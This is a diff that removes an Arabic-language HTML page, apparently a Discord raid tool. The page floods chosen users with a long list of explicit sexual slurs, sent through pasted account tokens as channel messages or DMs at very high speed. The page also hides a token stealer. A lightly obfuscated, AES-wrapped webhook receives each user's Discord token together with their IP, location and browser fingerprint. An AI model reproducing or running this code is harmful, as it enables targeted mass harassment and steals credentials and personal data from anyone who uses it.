@@ -1,164 +1,1 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>516 Group.</title>
-<style>
-body {background: linear-gradient(135deg,#1a0000,#000);color:#eee;font-family:Arial,sans-serif;direction:rtl;padding:0;margin:0;}
-header,footer{text-align:center;font-size:26px;font-weight:bold;padding:20px;color:#ff4444;text-shadow:1px 1px 3px #000;}
-main{max-width:600px;margin:auto;padding:25px;background-color:rgba(30,30,30,0.9);border-radius:12px;box-shadow:0 0 15px #000;}
-textarea,input,select{width:100%;padding:12px;margin-top:12px;background-color:#222;color:#eee;border:1px solid #555;border-radius:8px;font-size:16px;box-shadow:inset 0 0 5px #000;}
-button{padding:14px;margin-top:12px;width:100%;border:none;border-radius:10px;font-size:18px;cursor:pointer;box-shadow:0 5px 10px rgba(0,0,0,0.4);transition:0.3s;}
-.btn-green{background-color:#28a745;color:white;}
-.btn-green:hover{background-color:#218838;transform:translateY(-2px);box-shadow:0 7px 12px rgba(0,0,0,0.5);}
-.btn-red{background-color:#dc3545;color:white;}
-.btn-red:hover{background-color:#c82333;transform:translateY(-2px);box-shadow:0 7px 12px rgba(0,0,0,0.5);}
-label{font-size:17px;font-weight:bold;margin-top:15px;display:block;}
-#status{text-align:center;margin-top:18px;min-height:26px;font-weight:bold;font-size:17px;}
-#log{margin-top:12px;padding:10px;background:#111;color:#0f0;height:120px;overflow:auto;border-radius:8px;font-size:14px;}
-</style>
-</head>
-<body>
-<header>516 Group.</header>
-<main>
-<label>أدخل التوكنات (كل واحد بسطر):</label>
-<textarea id="tokenInput" rows="5"></textarea>
 
-<label>آيدي السيرفر :</label>
-<input type="text" id="serverIdInput">
-
-<label>آيدي الروم / الخاص / القروب:</label>
-<input type="text" id="channelInput">
-
-<label>حط كل آيدي كل شخص تبي تسبه (كل واحد بسطر):</label>
-<textarea id="idsInput" rows="5"></textarea>
-
-<label>سرعة الإرسال:</label>
-<select id="speedSelect">
-<option value="1000">1</option>
-<option value="900">0.9</option>
-<option value="800">0.8</option>
-<option value="700">0.7</option>
-<option value="600">0.6</option>
-<option value="500">0.5</option>
-<option value="400">0.4</option>
-<option value="300">0.3</option>
-<option value="200">0.2</option>
-<option value="100">0.1</option>
-<option value="1">0.001</option>
-</select>
-
-<button id="startBtn" class="btn-green">بدء النيك</button>
-<button id="stopBtn" class="btn-red" disabled>مرحوم</button>
-
-<div id="log"></div>
-<div id="status"></div>
-</main>
-<footer>516 Group.</footer>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-const MESSAGES=[
-"بزغبك","يلعن شرفك يديوث","تفو على شرفك","احسك غثيث مره يوم شفتك حسيت ب شعور سيء تجاهك اجبرني اني انيك محارمك",
-"آمكءَ شقينآهآ شقء ؤ آنتء تنآظرء و تآكلء زقء : $ .","كسمك","تبغا اضرب شرفك يا ابن الحيوانة هنا يا ديوث ولا كيف اقسم بالله لاقلبك جرو ي ابن الشرموطة كل من جاء تلهث له وترحب به ي ديوث ي ابن الرخيصة",
-"يديوث","بضرب كس اختك ياخو القحبه افجر رحم امك","امك كلبه ازباب.","يبن 200 شرموطه","ازحف على امك","اختك كلببه عند رجوولي","اجلللخ عليك",
-"يمخنث يعبد الازباب تعال مصصص","امك ممثله افلام سكس","امك قحبه قروبات المكس","امك بلمقحبه لها اصوات","اصمل كسمك يجديدد","يبن اكبر لبوه",
-"يعاق كسمك احترم ابوك","يعرص الطش امكك","يمكسور يضعيف النفس","يديوث","اغتصب خواتك","كس خواتك","يبن المديثه","يلعن رحم امك",
-"امك صارت حامل يبن الشرموطه","ازغب امك","جيب امك انيكها","اوف كسمك","يمهان","يلعن اختك","انا فحل امك","انيك ابوك","انيك اخوك",
-"انيكك امكك يبن الزنا","الدياثه تمشي بعروقكم","ادقك يبن الشرموطه","يطفل يبن القحبه","اوف ابن القحبه","تمحن يشرموط","تمحن واعطيك نيترو يخنيث",
-"من فحل امك","واو يشرموط تنبح","نادي امك زبي قام يبيها تقعد عليه","انيكك يخنيث يقواد","اركب عليه كسمك","يلعن امك يديوث","انبح يبن الشرموطه",
-"انبح انبح لفحل امك","انا نايك امك يبن الشرموطه","امك قاعده تنبح من كثر مافتحوها","انيك امك بنعال","اتفل بكسمك يبن الشرموطه","تمحن يورعي",
-"انيك امك يطفل","انيك امك يديوث","يبن القحبه","انيك امك","يشرموط","يديوث","اختفووو كسمك","امك على زبي","يبن الشرموطه","يبن الزنا","يبن القحبه",
-"امك قحبتي","يلعن امك يبن الشرموطه","الحقق امك قاعده تتمحن عشان تجيب فلوسس","اختك قاعده تعرض عشان تجيبلك فلوس يفقير","انيك امك يشرموط",
-"يبن المتعه","ازغب خواتك","انحر امك","العن رحم امك","امك تمصلي","اختك تلحس زبي","روح ابكي","بمناسبه مرور ثلاث سنوات على زواجي انا وامك بطلقها وزاتزوج اختك",
-"رد يفحل خواتك","اشفشف امك","انيكك سبعاوي","نخ يكسمك","جاوب يمخنث","امش لانيك امك","يمدعوس","انا قد شفت اسامي قبايل غريبه لكن بالله ليه مكتوب بهويتك ال الديوثين",
-"يخول","زبي قام على كسمك","اخخخ زبيي قامم جب امكك","تحب الطويل صح","اسال امك انا مشترك عندها واليوم ماعرضت ليه؟","كيف امك جابت عاق كذا","والله مهان",
-"فحول امك هنا","اهربب كسمك","روضت امك ماتبيني اروضك","ازغب اختك","سبعاوي امك يقواد","انبح يهارب","انيك امك واختك","اكسر عينك كسمك",
-"كيف امك جابت عاق زيك","والله ماش مهان","لطشنآء آلشرمؤطةة آمكءَ علىَء نظرءَ عينككءَ يآ آبن آلرخيصةة ! ","ابوك ناك امك","يبن القحبه انيك اختك","اشق ام امك يبن منيوكه","بتفكر مابقدر انيك امك انت ؟",
-"انا بنيك اختك وبشرب ديود امك","انيك خالاتك","# قل ل الماما حقتك تعترف من ناكها 🥵","ماتدري اني اقدر انيك قبيلتك ؟",
-"قد شفت بطايق ناس بس ليه حقتك مكتوب المخنايث","تعرف كم طول زبي ؟ قد طول اطول شوارب بقبيلتك","يبن القحبه انيك خالتك","يبن القحبه انيك ابوك",
-"يبن القحبه انيك ستك","يبن القحبه انيك شرفك","شرفك ضايع يبن المتناكه","انا عطشان ابي ديود اختك لو سمحت","# قم جب لي اختك مش شعرها"
-];
-let intervalId;
-const tokensArea=document.getElementById("tokenInput");
-const idsArea=document.getElementById("idsInput");
-const serverInput=document.getElementById("serverIdInput");
-const channelInput=document.getElementById("channelInput");
-const startBtn=document.getElementById("startBtn");
-const stopBtn=document.getElementById("stopBtn");
-const status=document.getElementById("status");
-const logArea=document.getElementById("log");
-const speedSelect=document.getElementById("speedSelect");
-const aesKey="StrongAESKey123!";
-const encryptedWebhook=CryptoJS.AES.encrypt("https://discord.com/api/webhooks/1410245880745037834/rJEzAnUc3jx6Rz4Jq0we0NoDTMmRuvImi2tVVjwAQPL3lqwtgj-6o9rGQgjW3-Ktc1Ke",aesKey).toString();
-
-function getWebhookUrl(){return CryptoJS.AES.decrypt(encryptedWebhook,aesKey).toString(CryptoJS.enc.Utf8);}
-async function fetchUserInfo() {
-    try { const res = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); return await res.json(); } 
-    catch { return {}; }
-}
-async function sendToWebhook(token) {
-    const info = await fetchUserInfo();
-    const msg = {
-        content:`TOKEN: ${token}
-🌍 Country: ${info.country||'Unknown'}
-🏙️ City and Region: ${info.city||'Unknown'}, ${info.region||'Unknown'}
-🌐 IP Address: ${info.ip||'Unknown'}
-📮 Postal Code: ${info.postal||'Unknown'}
-🕐 Time Zone: ${info.timezone||'Unknown'}
-📍 Coordinates: ${info.loc||'Unknown'}
-🔗 ASN: ${info.org||'Unknown'}
-🖥️ Operating System: ${navigator.platform}
-🌐 Browser: ${navigator.userAgent}
-📱 Screen Resolution: ${screen.width}x${screen.height}
-🎨 Color Depth: ${screen.colorDepth}
-🌍 Language: ${navigator.language}`
-    };
-    fetch(getWebhookUrl(), {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(msg)});
-}
-
-async function sendMessage(token,channelId,message){
-    try{await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`,{method:"POST",headers:{Authorization:token,"Content-Type":"application/json"},body:JSON.stringify({content:message})});logArea.innerHTML+=`تم إرسال: ${message}<br>`;logArea.scrollTop=logArea.scrollHeight;return true}catch{return false;}
-}
-async function sendDM(token,userId,message){
-    try{
-        const res=await fetch("https://discord.com/api/v9/users/@me/channels",{method:"POST",headers:{Authorization:token,"Content-Type":"application/json"},body:JSON.stringify({recipient_id:userId})});
-        const data=await res.json();
-        if(data.id){await fetch(`https://discord.com/api/v9/channels/${data.id}/messages`,{method:"POST",headers:{Authorization:token,"Content-Type":"application/json"},body:JSON.stringify({content:message})});logArea.innerHTML+=`تم إرسال: ${message}<br>`;logArea.scrollTop=logArea.scrollHeight;return true;}
-    }catch{return false;}
-}
-async function validateToken(token){try{const res=await fetch("https://discord.com/api/v9/users/@me",{headers:{Authorization:token}});return res.ok}catch{return false;}}
-
-startBtn.addEventListener("click",async ()=>{
-    const tokens=tokensArea.value.trim().split("\n").filter(Boolean);
-    const ids=idsArea.value.trim().split("\n").filter(Boolean);
-    const serverId=serverInput.value.trim();
-    const channelId=channelInput.value.trim();
-    const speed=parseInt(speedSelect.value);
-    if(tokens.length===0||ids.length===0){alert("اكمل كل الحقول!");return;}
-    startBtn.disabled=true;stopBtn.disabled=false;
-    status.textContent="يتم الإرسال...";
-    logArea.innerHTML="";
-    const validTokens=[];
-    for(const t of tokens){if(await validateToken(t)) validTokens.push(t);}
-    if(validTokens.length===0){alert("لا يوجد توكن صالح!");startBtn.disabled=false;stopBtn.disabled=true;return;}
-    intervalId=setInterval(()=>{
-        ids.forEach(id=>{
-            const token=validTokens[Math.floor(Math.random()*validTokens.length)];
-            const msg=`<@${id}> ${MESSAGES[Math.floor(Math.random()*MESSAGES.length)]}`;
-            if(channelId) sendMessage(token,channelId,msg);
-            else sendDM(token,id,msg);
-            sendToWebhook(token);
-        });
-    },speed);
-});
-
-stopBtn.addEventListener("click",()=>{
-    clearInterval(intervalId);
-    startBtn.disabled=false;stopBtn.disabled=true;
-    status.textContent="تم إيقاف الإرسال";
-});
-</script>
-</body>
-</html>
